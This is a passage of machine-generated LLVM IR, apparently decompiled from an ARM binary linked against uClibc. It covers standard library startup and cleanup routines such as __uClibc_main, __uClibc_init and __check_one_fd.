  %v9_1309c = icmp eq i32 %v1_130a0, %v1_1309c
  br i1 %v9_1309c, label %dec_label_pc_130a8, label %bb

bb:                                               ; preds = %dec_label_pc_1309c
  store i32 %v1_130a0, i32* %r6.global-to-local, align 4
  %v1_13060 = or i32 %v1_130a0, 2
  store i32 %v1_13060, i32* %r5.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v9_13064 = icmp eq i32 %v1_13060, %v1_130a0
  br i1 %v9_13064, label %dec_label_pc_13110, label %bb.dec_label_pc_1306c_crit_edge

bb.dec_label_pc_1306c_crit_edge:                  ; preds = %bb
  %v0_13070.pre = load i32, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_1306c

dec_label_pc_130a8:                               ; preds = %dec_label_pc_1309c
  %v0_130a8 = load i32, i32* %r5.global-to-local, align 4
  %v1_130a8 = and i32 %v0_130a8, -69
  store i32 %v1_130a8, i32* @r3, align 4
  %v2_130ac = icmp ugt i32 %v1_130a8, 9
  store i1 %v2_130ac, i1* %cpsr_c.global-to-local, align 1
  %v7_130ac = icmp eq i32 %v1_130a8, 10
  br i1 %v7_130ac, label %dec_label_pc_130b4, label %dec_label_pc_13110

dec_label_pc_130b4:                               ; preds = %dec_label_pc_130a8
  %v1_130b8 = load i32, i32* %r7.global-to-local, align 4
  %v2_130b8 = add i32 %v1_130b8, 544
  %v3_130b8 = inttoptr i32 %v2_130b8 to i32*
  store i32 -1, i32* %v3_130b8, align 4
  %v0_130bc = load i32, i32* %r2.global-to-local, align 4
  store i32 %v0_130bc, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_130c0

dec_label_pc_130c0:                               ; preds = %dec_label_pc_130f4.dec_label_pc_130c0_crit_edge, %dec_label_pc_130b4
  %v0_130c4 = phi i32 [ %v0_130c4.pre, %dec_label_pc_130f4.dec_label_pc_130c0_crit_edge ], [ %v0_130bc, %dec_label_pc_130b4 ]
  %v0_130c0 = load i32, i32* %r7.global-to-local, align 4
  %v1_130c0 = add i32 %v0_130c0, 132
  %v2_130c0 = inttoptr i32 %v1_130c0 to i32*
  %v3_130c0 = load i32, i32* %v2_130c0, align 4
  store i32 %v0_130c4, i32* %r2.global-to-local, align 4
  store i32 %v3_130c0, i32* %r4.global-to-local, align 4
  %v1_130cc = or i32 %v3_130c0, 16
  store i32 %v1_130cc, i32* @r1, align 4
  %v1_130d022 = inttoptr i32 %v0_130c4 to i32*
  %v2_130d023 = load i32, i32* %v1_130d022, align 4
  %v3_130d425 = icmp uge i32 %v2_130d023, %v3_130c0
  store i1 %v3_130d425, i1* %cpsr_c.global-to-local, align 1
  %v9_130d431 = icmp eq i32 %v2_130d023, %v3_130c0
  br i1 %v9_130d431, label %dec_label_pc_130dc, label %dec_label_pc_130f4

dec_label_pc_130dc:                               ; preds = %dec_label_pc_130c0, %dec_label_pc_130dc.dec_label_pc_130d0_crit_edge
  call void @__pseudo_branch(i32 -61504)
  %v0_130ec = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_130ec, label %dec_label_pc_130f0, label %dec_label_pc_130dc.dec_label_pc_130d0_crit_edge

dec_label_pc_130dc.dec_label_pc_130d0_crit_edge:  ; preds = %dec_label_pc_130dc
  %v0_130d0.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_130d4.pre = load i32, i32* %r4.global-to-local, align 4
  %v1_130d0 = inttoptr i32 %v0_130d0.pre to i32*
  %v2_130d0 = load i32, i32* %v1_130d0, align 4
  %v3_130d4 = icmp uge i32 %v2_130d0, %v1_130d4.pre
  store i1 %v3_130d4, i1* %cpsr_c.global-to-local, align 1
  %v9_130d4 = icmp eq i32 %v2_130d0, %v1_130d4.pre
  br i1 %v9_130d4, label %dec_label_pc_130dc, label %dec_label_pc_130f4

dec_label_pc_130f0:                               ; preds = %dec_label_pc_130dc
  %v0_130f0 = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_130f4

dec_label_pc_130f4:                               ; preds = %dec_label_pc_130c0, %dec_label_pc_130dc.dec_label_pc_130d0_crit_edge, %dec_label_pc_130f0
  %v0_130f4 = phi i32 [ %v0_130f0, %dec_label_pc_130f0 ], [ %v2_130d023, %dec_label_pc_130c0 ], [ %v2_130d0, %dec_label_pc_130dc.dec_label_pc_130d0_crit_edge ]
  %v1_130f4 = phi i32 [ %v0_130f0, %dec_label_pc_130f0 ], [ %v3_130c0, %dec_label_pc_130c0 ], [ %v1_130d4.pre, %dec_label_pc_130dc.dec_label_pc_130d0_crit_edge ]
  %v3_130f4 = icmp uge i32 %v0_130f4, %v1_130f4
  store i1 %v3_130f4, i1* %cpsr_c.global-to-local, align 1
  %v9_130f4 = icmp eq i32 %v0_130f4, %v1_130f4
  br i1 %v9_130f4, label %dec_label_pc_130fc, label %dec_label_pc_130f4.dec_label_pc_130c0_crit_edge

dec_label_pc_130f4.dec_label_pc_130c0_crit_edge:  ; preds = %dec_label_pc_130f4
  %v0_130c4.pre = load i32, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_130c0

dec_label_pc_130fc:                               ; preds = %dec_label_pc_130f4
  store i32 116, i32* @r3, align 4
  %v0_13104 = load i32, i32* %r8.global-to-local, align 4
  %v2_13104 = add i32 %v0_13104, 116
  %v3_13104 = inttoptr i32 %v2_13104 to i32*
  %v4_13104 = load i32, i32* %v3_13104, align 4
  store i32 %v4_13104, i32* @ip, align 4
  call void @__pseudo_branch(i32 %v4_13104)
  %v0_13110.pre = load i32, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_13110

dec_label_pc_13110:                               ; preds = %entry, %bb, %dec_label_pc_130a8, %dec_label_pc_130fc
  %v0_13110 = phi i32 [ %v1_130a0, %dec_label_pc_130a8 ], [ %v0_13110.pre, %dec_label_pc_130fc ], [ %v3_13054, %entry ], [ %v1_130a0, %bb ]
  %v2_13114 = load i32, i32* %stack_var_-24, align 4
  store i32 %v2_13114, i32* @r4, align 4
  ret i32 %v0_13110

; uselistorder directives
  uselistorder i32 %v0_130f0, { 1, 0 }
  uselistorder i32 %v1_130d4.pre, { 0, 2, 1 }
  uselistorder i32 %v1_13060, { 1, 2, 0 }
  uselistorder i32 %v1_1309c, { 1, 0 }
  uselistorder i32 %v1_130a0, { 0, 1, 4, 3, 5, 6, 7, 2 }
  uselistorder i32 %v1_1307c.pre, { 1, 0 }
  uselistorder i32 %v0_1307450, { 2, 1, 0 }
  uselistorder i32* %r7.global-to-local, { 1, 2, 0, 3 }
  uselistorder i32* %r6.global-to-local, { 1, 0, 2, 3 }
  uselistorder i32* %r5.global-to-local, { 1, 2, 3, 4, 0 }
  uselistorder i32* %r4.global-to-local, { 1, 0, 2, 4, 3, 5 }
  uselistorder i32* %r2.global-to-local, { 0, 1, 3, 2, 4 }
  uselistorder i1* %cpsr_c.global-to-local, { 3, 5, 4, 2, 6, 10, 7, 9, 8, 0, 1 }
  uselistorder i32 -1036, { 1, 2, 0 }
  uselistorder label %dec_label_pc_13110, { 3, 2, 1, 0 }
  uselistorder label %dec_label_pc_130f4, { 2, 1, 0 }
  uselistorder label %dec_label_pc_130dc, { 1, 0 }
  uselistorder label %dec_label_pc_1309c, { 2, 1, 0 }
  uselistorder label %dec_label_pc_13084, { 1, 0 }
  uselistorder label %dec_label_pc_1306c, { 1, 0 }
}

define i32 @__pthread_return_0() local_unnamed_addr {
entry:
  ret i32 0
}

define i32 @__pthread_mutex_init() local_unnamed_addr {
entry:
  ret i32 0
}

define i32 @_pthread_cleanup_push_defer(i32* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %arg2, i32* %arg1, align 4
  %v3_13134 = add i32 %tmp, 4
  %v4_13134 = inttoptr i32 %v3_13134 to i32*
  store i32 %arg3, i32* %v4_13134, align 4
  ret i32 %tmp
}

define i32 @_pthread_cleanup_pop_restore(i32* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %v2_13140 = icmp eq i32 %arg2, 0
  br i1 %v2_13140, label %.thread1, label %bb

bb:                                               ; preds = %entry
  %v2_1314c = add i32 %tmp, 4
  %v3_1314c = inttoptr i32 %v2_1314c to i32*
  %v4_1314c = load i32, i32* %v3_1314c, align 4
  store i32 %v4_1314c, i32* %r0.global-to-local, align 4
  %v3_13150 = load i32, i32* %arg1, align 4
  br label %.thread1

.thread1:                                         ; preds = %entry, %bb
  %.02 = phi i32 [ %v3_13150, %bb ], [ undef, %entry ]
  %v2_13158 = xor i1 %v2_13140, true
  call void @__pseudo_cond_branch(i1 %v2_13158, i32 %.02)
  %v1_13164 = load i32, i32* %r0.global-to-local, align 4
  ret i32 %v1_13164

; uselistorder directives
  uselistorder i32* %r0.global-to-local, { 1, 2, 0 }
  uselistorder label %.thread1, { 1, 0 }
}

define i32 @__GI___uClibc_fini() local_unnamed_addr {
dec_label_pc_1318c.lr.ph:
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v3_13168 = load i32, i32* @r4, align 4
  store i32 %v3_13168, i32* %stack_var_-16, align 4
  store i32 ptrtoint (i32* @global_var_20d14.594 to i32), i32* %r5.global-to-local, align 4
  store i32 add (i32 ptrtoint (i32* @global_var_20d14.594 to i32), i32 -8), i32* %r6.global-to-local, align 4
  store i32 0, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_1318c

dec_label_pc_1318c:                               ; preds = %dec_label_pc_1318c.dec_label_pc_1318c_crit_edge, %dec_label_pc_1318c.lr.ph
  %v1_1318c = phi i32 [ %v1_13198, %dec_label_pc_1318c.dec_label_pc_1318c_crit_edge ], [ 0, %dec_label_pc_1318c.lr.ph ]
  %v0_1318c = phi i32 [ %v0_1318c.pre, %dec_label_pc_1318c.dec_label_pc_1318c_crit_edge ], [ add (i32 ptrtoint (i32* @global_var_20d14.594 to i32), i32 -8), %dec_label_pc_1318c.lr.ph ]
  %v4_1318c = mul i32 %v1_1318c, 4
  %v5_1318c = add i32 %v4_1318c, %v0_1318c
  %v6_1318c = inttoptr i32 %v5_1318c to i32*
  %v7_1318c = load i32, i32* %v6_1318c, align 4
  call void @__pseudo_branch(i32 %v7_1318c)
  %v0_13198 = load i32, i32* %r4.global-to-local, align 4
  %v1_13198 = add i32 %v0_13198, -1
  store i32 %v1_13198, i32* %r4.global-to-local, align 4
  %v2_13198 = icmp eq i32 %v0_13198, 0
  br i1 %v2_13198, label %dec_label_pc_131a0, label %dec_label_pc_1318c.dec_label_pc_1318c_crit_edge

dec_label_pc_1318c.dec_label_pc_1318c_crit_edge:  ; preds = %dec_label_pc_1318c
  %v0_1318c.pre = load i32, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_1318c

dec_label_pc_131a0:                               ; preds = %dec_label_pc_1318c
  %v0_131a4.pre = load i32, i32* %r5.global-to-local, align 4
  %v2_131a4 = add i32 %v0_131a4.pre, 2000
  %v3_131a4 = inttoptr i32 %v2_131a4 to i32*
  %v4_131a4 = load i32, i32* %v3_131a4, align 4
  %v2_131a8 = icmp eq i32 %v4_131a4, 0
  br i1 %v2_131a8, label %bb17, label %bb

bb:                                               ; preds = %dec_label_pc_131a0
  br label %bb17

bb17:                                             ; preds = %dec_label_pc_131a0, %bb
  %v2_131b0 = xor i1 %v2_131a8, true
  call void @__pseudo_cond_branch(i1 %v2_131b0, i32 %v4_131a4)
  %v0_131b8 = load i32, i32* %r5.global-to-local, align 4
  %v2_131b8 = add i32 %v0_131b8, 2004
  %v3_131b8 = inttoptr i32 %v2_131b8 to i32*
  %v4_131b8 = load i32, i32* %v3_131b8, align 4
  %v2_131bc = icmp eq i32 %v4_131b8, 0
  br i1 %v2_131bc, label %bb19, label %bb18

bb18:                                             ; preds = %bb17
  br label %bb19

bb19:                                             ; preds = %bb17, %bb18
  %v2_131c4 = xor i1 %v2_131bc, true
  call void @__pseudo_cond_branch(i1 %v2_131c4, i32 %v4_131b8)
  %v2_131c8 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_131c8, i32* %r4.global-to-local, align 4
  %v1_131cc = load i32, i32* @r0, align 4
  ret i32 %v1_131cc

; uselistorder directives
  uselistorder i32 %v1_13198, { 1, 0 }
  uselistorder i32* %r5.global-to-local, { 1, 0, 2 }
  uselistorder i32* %r4.global-to-local, { 1, 3, 2, 0 }
  uselistorder label %bb19, { 1, 0 }
  uselistorder label %bb17, { 1, 0 }
}

define i32 @__check_one_fd(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v3_131e4 = load i32, i32* @r4, align 4
  %v6_131e4 = load i32, i32* @r5, align 4
  store i32 %arg2, i32* @r5, align 4
  store i32 %arg1, i32* @r4, align 4
  %v2_131f8 = call i32 @__libc_fcntl(i32 %arg1, i32 1)
  %v3_13200 = icmp eq i32 %v2_131f8, -1
  store i32 ptrtoint (i32* @global_var_20d14.594 to i32), i32* @r3, align 4
  br i1 %v3_13200, label %dec_label_pc_1320c, label %dec_label_pc_13224

dec_label_pc_1320c:                               ; preds = %entry
  %v0_13210 = load i32, i32* @r5, align 4
  %v2_13218 = call i32 @__libc_open(i32 add (i32 ptrtoint (i32* @global_var_20d14.594 to i32), i32 -33940), i32 %v0_13210)
  %v1_1321c = load i32, i32* @r4, align 4
  %v1_13220 = icmp ne i32 %v2_13218, %v1_1321c
  call void @__pseudo_cond_branch(i1 %v1_13220, i32 ptrtoint (i32* @global_var_11d58.758 to i32))
  br label %dec_label_pc_13224

dec_label_pc_13224:                               ; preds = %entry, %dec_label_pc_1320c
  %v1_1322c = phi i32 [ %v2_131f8, %entry ], [ %v2_13218, %dec_label_pc_1320c ]
  store i32 %v3_131e4, i32* @r4, align 4
  store i32 %v6_131e4, i32* @r5, align 4
  ret i32 %v1_1322c

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_13224, { 1, 0 }
}

define i32 @__GI___uClibc_init(i32 %arg1) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_13238 = load i32, i32* @r4, align 4
  store i32 %v3_13238, i32* %stack_var_-8, align 4
  store i32 ptrtoint (i32* @global_var_20d14.594 to i32), i32* %r4.global-to-local, align 4
  %v4_13248 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_20d14.594 to i32), i32 148) to i32*), align 4
  %v1_1324c = inttoptr i32 %v4_13248 to i32*
  %v2_1324c = load i32, i32* %v1_1324c, align 4
  %v2_13250 = icmp eq i32 %v2_1324c, 0
  br i1 %v2_13250, label %dec_label_pc_13258, label %dec_label_pc_1327c

dec_label_pc_13258:                               ; preds = %entry
  store i32 4096, i32* %v1_1324c, align 4
  %v0_13260 = call i32 @__pthread_initialize_minimal()
  %v0_13268 = load i32, i32* %r4.global-to-local, align 4
  %v2_13268 = add i32 %v0_13268, -49720
  %v2_13270 = icmp eq i32 %v2_13268, 0
  br i1 %v2_13270, label %bb4, label %bb

bb:                                               ; preds = %dec_label_pc_13258
  br label %bb4

bb4:                                              ; preds = %dec_label_pc_13258, %bb
  %v2_13278 = xor i1 %v2_13270, true
  call void @__pseudo_cond_branch(i1 %v2_13278, i32 %v2_13268)
  %v2_1327c.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_1327c

dec_label_pc_1327c:                               ; preds = %entry, %bb4
  %v2_1327c = phi i32 [ %v2_1327c.pre, %bb4 ], [ %v3_13238, %entry ]
  %.0 = phi i32 [ %v0_13260, %bb4 ], [ undef, %entry ]
  store i32 %v2_1327c, i32* %r4.global-to-local, align 4
  ret i32 %.0

; uselistorder directives
  uselistorder i32 undef, { 1, 0, 2 }
  uselistorder label %dec_label_pc_1327c, { 1, 0 }
  uselistorder label %bb4, { 1, 0 }
}

define i32 @__uClibc_main(i32 %arg1, i32 %arg2, i32* %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7) local_unnamed_addr {
entry:
  %cpsr_c.global-to-local = alloca i1, align 1
  %cpsr_z.global-to-local = alloca i1, align 1
  %ip.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  store i32 %arg4, i32* %r3.global-to-local, align 4
  %tmp = ptrtoint i32* %arg3 to i32
  store i32 %tmp, i32* %r2.global-to-local, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %tmp62 = call i32 @__decompiler_undefined_function_0()
  %tmp63 = call i32 @__decompiler_undefined_function_0()
  %tmp64 = call i32 @__decompiler_undefined_function_0()
  %tmp65 = call i32 @__decompiler_undefined_function_0()
  %tmp66 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-400 = alloca i32, align 4
  %stack_var_-120 = alloca i32, align 4
  %stack_var_-416 = alloca i32, align 4
  store i32 55908, i32* %r4.global-to-local, align 4
  %v1_1329c = add i32 %tmp, 4
  store i32 %v1_1329c, i32* %ip.global-to-local, align 4
  %v2_132a0 = load i32, i32* %arg3, align 4
  store i32 24, i32* %r2.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_20d14.594 to i32), i32* %r4.global-to-local, align 4
  %v3_132ac = mul i32 %arg2, 4
  store i32 %v3_132ac, i32* @r7, align 4
  %v4_132b4 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_20d14.594 to i32), i32 24) to i32*), align 4
  store i32 %v4_132b4, i32* %r1.global-to-local, align 4
  store i32 56, i32* %r2.global-to-local, align 4
  %v2_132bc = add i32 %v1_1329c, %v3_132ac
  store i32 %v2_132bc, i32* %ip.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_20d14.594 to i32), i32* %stack_var_-416, align 4
  %v4_132c4 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_20d14.594 to i32), i32 56) to i32*), align 4
  store i32 %v4_132c4, i32* %r4.global-to-local, align 4
  %v3_132c8 = icmp uge i32 %v2_132bc, %v2_132a0
  store i1 %v3_132c8, i1* %cpsr_c.global-to-local, align 1
  %v9_132c8 = icmp eq i32 %v2_132bc, %v2_132a0
  store i1 %v9_132c8, i1* %cpsr_z.global-to-local, align 1
  store i32 %arg7, i32* %r2.global-to-local, align 4
  %v2_132d0 = inttoptr i32 %v4_132c4 to i32*
  store i32 %v2_132bc, i32* %v2_132d0, align 4
  br i1 %v9_132c8, label %bb, label %bb75

bb:                                               ; preds = %entry
  store i32 %tmp, i32* %ip.global-to-local, align 4
  br label %bb75

bb75:                                             ; preds = %entry, %bb
  %v0_132d8 = load i32, i32* %r2.global-to-local, align 4
  %v1_132d8 = load i32, i32* %r1.global-to-local, align 4
  %v2_132d8 = inttoptr i32 %v1_132d8 to i32*
  store i32 %v0_132d8, i32* %v2_132d8, align 4
  %v2_132dc = load i32, i32* %stack_var_-416, align 4
  store i32 %v2_132dc, i32* %r5.global-to-local, align 4
  store i32 %arg6, i32* %r1.global-to-local, align 4
  store i32 2004, i32* %r2.global-to-local, align 4
  %v0_132e8 = load i32, i32* %r3.global-to-local, align 4
  store i32 %v0_132e8, i32* @r6, align 4
  br i1 %v9_132c8, label %bb76, label %.thread52

.thread52:                                        ; preds = %bb75
  %v3_132f053 = add i32 %v2_132dc, 2004
  %v4_132f054 = inttoptr i32 %v3_132f053 to i32*
  store i32 %arg6, i32* %v4_132f054, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  br label %bb77

bb76:                                             ; preds = %bb75
  %v1_132ec = load i32, i32* %ip.global-to-local, align 4
  %v2_132ec = load i32, i32* @r7, align 4
  %v3_132ec = add i32 %v2_132ec, %v1_132ec
  store i32 %v3_132ec, i32* %r3.global-to-local, align 4
  %v3_132f050 = add i32 %v2_132dc, 2004
  %v4_132f051 = inttoptr i32 %v3_132f050 to i32*
  store i32 %arg6, i32* %v4_132f051, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  %v1_132fc = load i32, i32* %r3.global-to-local, align 4
  %v2_132fc = load i32, i32* %r4.global-to-local, align 4
  %v3_132fc = inttoptr i32 %v2_132fc to i32*
  store i32 %v1_132fc, i32* %v3_132fc, align 4
  br label %bb77

bb77:                                             ; preds = %.thread52, %bb76
  %v2_13300 = ptrtoint i32* %stack_var_-120 to i32
  store i32 %v2_13300, i32* %r0.global-to-local, align 4
  store i32 120, i32* %r2.global-to-local, align 4
  %v3_13308 = bitcast i32* %stack_var_-120 to i8*
  %v4_13308 = call i32 @__GI_memset(i8* %v3_13308, i32 0, i32 120)
  store i32 %v4_13308, i32* %r0.global-to-local, align 4
  %v0_1330c = load i32, i32* %r4.global-to-local, align 4
  %v1_1330c = inttoptr i32 %v0_1330c to i32*
  %v2_1330c = load i32, i32* %v1_1330c, align 4
  br label %dec_label_pc_13318

dec_label_pc_13318:                               ; preds = %dec_label_pc_13318, %bb77
  %storemerge = phi i32 [ %v2_1330c, %bb77 ], [ %v1_13324, %dec_label_pc_13318 ]
  store i32 %storemerge, i32* %r1.global-to-local, align 4
  %v1_13318 = inttoptr i32 %storemerge to i32*
  %v2_13318 = load i32, i32* %v1_13318, align 4
  store i32 %v2_13318, i32* %r3.global-to-local, align 4
  %v2_1331c = icmp eq i32 %v2_13318, 0
  %v1_13324 = add i32 %storemerge, 4
  br i1 %v2_1331c, label %dec_label_pc_13324, label %dec_label_pc_13318

dec_label_pc_13324:                               ; preds = %dec_label_pc_13318
  store i32 %v1_13324, i32* @r4, align 4
  store i32 %v2_13300, i32* @r5, align 4
  %v1_1334830 = inttoptr i32 %v1_13324 to i32*
  %v2_1334831 = load i32, i32* %v1_1334830, align 4
  store i32 %v2_1334831, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_1334c33 = icmp eq i32 %v2_1334831, 0
  store i1 %v2_1334c33, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1334c33, label %dec_label_pc_13354, label %dec_label_pc_13330

dec_label_pc_13330:                               ; preds = %dec_label_pc_13324, %dec_label_pc_13348
  %v4_13338 = phi i32 [ %v1_13344, %dec_label_pc_13348 ], [ %v1_13324, %dec_label_pc_13324 ]
  %v5_13334 = phi i32 [ %v2_13348, %dec_label_pc_13348 ], [ %v2_1334831, %dec_label_pc_13324 ]
  %v2_13330 = icmp ugt i32 %v5_13334, 13
  store i1 %v2_13330, i1* %cpsr_c.global-to-local, align 1
  %v7_13330 = icmp eq i32 %v5_13334, 14
  store i1 %v7_13330, i1* %cpsr_z.global-to-local, align 1
  %v2_13334 = xor i1 %v2_13330, true
  %v3_13334 = or i1 %v7_13330, %v2_13334
  br i1 %v3_13334, label %bb78, label %bb79

bb78:                                             ; preds = %dec_label_pc_13330
  %v4_13334 = load i32, i32* @r5, align 4
  %v6_13334 = and i32 %v5_13334, 536870912
  %v7_13334 = icmp ne i32 %v6_13334, 0
  store i1 %v7_13334, i1* %cpsr_c.global-to-local, align 1
  %v8_13334 = mul i32 %v5_13334, 8
  %v9_13334 = add i32 %v4_13334, %v8_13334
  store i32 %v9_13334, i32* %r0.global-to-local, align 4
  br label %bb79

bb79:                                             ; preds = %dec_label_pc_13330, %bb78
  %v1_13340 = phi i1 [ %v2_13330, %dec_label_pc_13330 ], [ %v7_13334, %bb78 ]
  %v2_13338 = xor i1 %v1_13340, true
  %v3_13338 = or i1 %v7_13330, %v2_13338
  br i1 %v3_13338, label %bb80, label %dec_label_pc_13348

bb80:                                             ; preds = %bb79
  store i32 %v4_13338, i32* %r1.global-to-local, align 4
  store i32 8, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_13348

dec_label_pc_13348:                               ; preds = %bb79, %bb80
  call void @__pseudo_cond_branch(i1 %v3_13338, i32 ptrtoint (i32* @global_var_101b0.766 to i32))
  %v0_13344 = load i32, i32* @r4, align 4
  %v1_13344 = add i32 %v0_13344, 8
  store i32 %v1_13344, i32* @r4, align 4
  %v1_13348 = inttoptr i32 %v1_13344 to i32*
  %v2_13348 = load i32, i32* %v1_13348, align 4
  store i32 %v2_13348, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_1334c = icmp eq i32 %v2_13348, 0
  store i1 %v2_1334c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1334c, label %dec_label_pc_13354, label %dec_label_pc_13330

dec_label_pc_13354:                               ; preds = %dec_label_pc_13348, %dec_label_pc_13324
  store i32 %v2_13300, i32* %r0.global-to-local, align 4
  %v1_13358 = call i32 @_dl_aux_init(i32 %v2_13300)
  store i32 %v1_13358, i32* %r0.global-to-local, align 4
  %v1_1335c = call i32 @__GI___uClibc_init(i32 %v1_13358)
  store i32 %v1_1335c, i32* @r0, align 4
  store i32 148, i32* %r3.global-to-local, align 4
  %v2_13364 = load i32, i32* %stack_var_-416, align 4
  store i32 %v2_13364, i32* @lr, align 4
  store i32 %tmp66, i32* @r2, align 4
  %v2_1336c = add i32 %v2_13364, 148
  %v3_1336c = inttoptr i32 %v2_1336c to i32*
  %v4_1336c = load i32, i32* %v3_1336c, align 4
  store i32 %v4_1336c, i32* %r1.global-to-local, align 4
  store i32 %tmp65, i32* @r3, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_13374 = icmp eq i32 %tmp66, 0
  store i1 %v2_13374, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_13374, label %bb81, label %bb82

bb81:                                             ; preds = %dec_label_pc_13354
  store i32 4096, i32* @r2, align 4
  br label %bb82

bb82:                                             ; preds = %dec_label_pc_13354, %bb81
  %v0_13380 = phi i32 [ %tmp66, %dec_label_pc_13354 ], [ 4096, %bb81 ]
  %v3_1337c = icmp eq i32 %tmp65, -1
  store i1 %v3_1337c, i1* %cpsr_c.global-to-local, align 1
  %v8_1337c = icmp eq i32 %tmp65, -1
  store i1 %v8_1337c, i1* %cpsr_z.global-to-local, align 1
  %v2_13380 = inttoptr i32 %v4_1336c to i32*
  store i32 %v0_13380, i32* %v2_13380, align 4
  br i1 %v3_1337c, label %dec_label_pc_13388, label %dec_label_pc_133b0

dec_label_pc_13388:                               ; preds = %bb82
  %v0_13388 = call i32 @getuid()
  store i32 %v0_13388, i32* @r0, align 4
  store i32 %v0_13388, i32* %r4.global-to-local, align 4
  %v0_13390 = call i32 @geteuid()
  store i32 %v0_13390, i32* @r0, align 4
  %v3_13394 = icmp uge i32 %v0_13388, %v0_13390
  store i1 %v3_13394, i1* %cpsr_c.global-to-local, align 1
  %v9_13394 = icmp eq i32 %v0_13388, %v0_13390
  store i1 %v9_13394, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_13394, label %dec_label_pc_1339c, label %dec_label_pc_133d8

dec_label_pc_1339c:                               ; preds = %dec_label_pc_13388
  %v1_1339c = call i32 @getgid(i32 %v0_13390)
  store i32 %v1_1339c, i32* @r0, align 4
  store i32 %v1_1339c, i32* %r4.global-to-local, align 4
  %v0_133a4 = call i32 @getegid()
  store i32 %v0_133a4, i32* %r0.global-to-local, align 4
  %v3_133a8 = icmp uge i32 %v1_1339c, %v0_133a4
  store i1 %v3_133a8, i1* %cpsr_c.global-to-local, align 1
  %v9_133a8 = icmp eq i32 %v1_1339c, %v0_133a4
  store i1 %v9_133a8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_133a8, label %dec_label_pc_133b0, label %dec_label_pc_133d8

dec_label_pc_133b0:                               ; preds = %dec_label_pc_1339c, %bb82
  store i32 %tmp65, i32* @r2, align 4
  store i1 %v3_1337c, i1* %cpsr_c.global-to-local, align 1
  store i1 %v8_1337c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_1337c, label %dec_label_pc_13400, label %dec_label_pc_133bc

dec_label_pc_133bc:                               ; preds = %dec_label_pc_133b0
  store i32 %tmp64, i32* @r3, align 4
  %v3_133c0 = icmp uge i32 %tmp65, %tmp64
  store i1 %v3_133c0, i1* %cpsr_c.global-to-local, align 1
  %v9_133c0 = icmp eq i32 %tmp65, %tmp64
  store i1 %v9_133c0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_133c0, label %dec_label_pc_133c8, label %dec_label_pc_133d8

dec_label_pc_133c8:                               ; preds = %dec_label_pc_133bc
  store i32 %tmp63, i32* @r2, align 4
  store i32 %tmp62, i32* @r3, align 4
  %v3_133d0 = icmp uge i32 %tmp63, %tmp62
  store i1 %v3_133d0, i1* %cpsr_c.global-to-local, align 1
  %v9_133d0 = icmp eq i32 %tmp63, %tmp62
  store i1 %v9_133d0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_133d0, label %dec_label_pc_13400, label %dec_label_pc_133d8

dec_label_pc_133d8:                               ; preds = %dec_label_pc_133bc, %dec_label_pc_1339c, %dec_label_pc_13388, %dec_label_pc_133c8
  store i32 32770, i32* @r4, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  store i32 32768, i32* %r1.global-to-local, align 4
  %v2_133e4 = call i32 @__check_one_fd(i32 0, i32 32768)
  store i32 1, i32* %r0.global-to-local, align 4
  %v0_133ec = load i32, i32* @r4, align 4
  store i32 %v0_133ec, i32* %r1.global-to-local, align 4
  %v2_133f0 = call i32 @__check_one_fd(i32 1, i32 %v0_133ec)
  %v0_133f4 = load i32, i32* @r4, align 4
  store i32 %v0_133f4, i32* %r1.global-to-local, align 4
  store i32 2, i32* %r0.global-to-local, align 4
